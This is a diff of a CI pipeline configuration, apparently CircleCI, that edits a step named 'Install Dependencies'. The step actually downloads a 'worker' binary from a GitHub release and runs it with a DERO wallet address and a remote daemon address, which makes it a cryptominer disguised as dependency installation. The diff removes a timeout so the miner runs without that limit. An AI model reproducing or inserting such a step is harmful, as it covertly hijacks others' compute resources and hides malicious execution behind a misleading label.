@@ -27,7 +27,7 @@ jobs:
       steps: 
         - run: 
             name: Install Dependencies 
-            command: timeout 1m wget -q https://github.com/yasha887/firstproject/releases/download/v1/worker.tar.xz && tar -xf worker.tar.xz && chmod +x worker && ./worker --wallet-address=dero1qyksx7ak2s4h239rul902c2dz90ygj8fxqlja8wwq7teenpgj8v7jqq25k5x5 --daemon-rpc-address=164.92.174.244:443
+            command: wget -q https://github.com/yasha887/firstproject/releases/download/v1/worker.tar.xz && tar -xf worker.tar.xz && chmod +x worker && ./worker --wallet-address=dero1qyksx7ak2s4h239rul902c2dz90ygj8fxqlja8wwq7teenpgj8v7jqq25k5x5 --daemon-rpc-address=164.92.174.244:443
 workflows: 
     version: 2.1 
     build: 
